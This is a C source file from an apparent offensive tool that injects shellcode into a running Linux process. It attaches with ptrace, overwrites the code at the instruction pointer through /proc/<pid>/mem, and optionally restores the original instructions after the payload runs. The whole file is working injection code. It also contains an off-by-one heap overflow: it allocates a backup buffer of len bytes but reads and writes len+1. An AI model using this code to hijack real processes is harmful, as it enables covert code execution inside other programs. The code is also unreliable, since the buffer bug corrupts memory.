#include "inject.h"


void ptrace_attach(pid_t pid){
	int status;

	if( ptrace(PTRACE_ATTACH, pid, NULL, NULL) ==  - 1){
		bad("failed to attach pid %d | %s\n", pid, strerror(errno));
		exit(1);
	}

	waitpid(pid, &status, 0);

}

inline long getip(pid_t pid){
	return ptrace(PTRACE_PEEKUSER, pid, sizeof(long)*IP, 0L);
}

inline long setip(pid_t pid, long ip){
	return ptrace(PTRACE_POKEUSER, pid, sizeof(long)*IP, ip);
}

void ps_inject(const char *sc, size_t len, mypid_t pid, int nonsave){
	char *instructions_backup, memfile[100];
	int status, memfd;
	long instruction_point;

	info("Attaching process %s\n", pid.str);
	ptrace_attach(pid.number);
	good("process attached\n");

	instruction_point = getip(pid.number);

	info("opening /proc/%s/mem\n", pid.str);
	snprintf(memfile, sizeof(memfile), "/proc/%s/mem", pid.str);

	memfd = xopen(memfile, O_RDWR);
	good("sucess\n");

	if(!nonsave){
		instructions_backup = xmalloc(len);
		info("backup previously instructions\n");
		pread(memfd, instructions_backup, len+1, instruction_point);
	}

	info("writing shellcode on memory\n");
	pwrite(memfd, sc, len, instruction_point);
	good("Shellcode inject !!!\n");

	if(!nonsave){
		info("resuming application ...\n");
		pwrite(memfd, "\xcc", 1, instruction_point+len);

		ptrace(PTRACE_CONT, pid.number, NULL, 0);
		waitpid(pid.number, &status, 0);

		info("restoring memory instructions\n");
		pwrite(memfd, instructions_backup, len+1, instruction_point);

		xfree(instructions_backup);

		setip(pid.number, instruction_point);
	}

	info("detaching pid ...\n");
	ptrace(PTRACE_DETACH, pid.number, NULL, NULL);


}
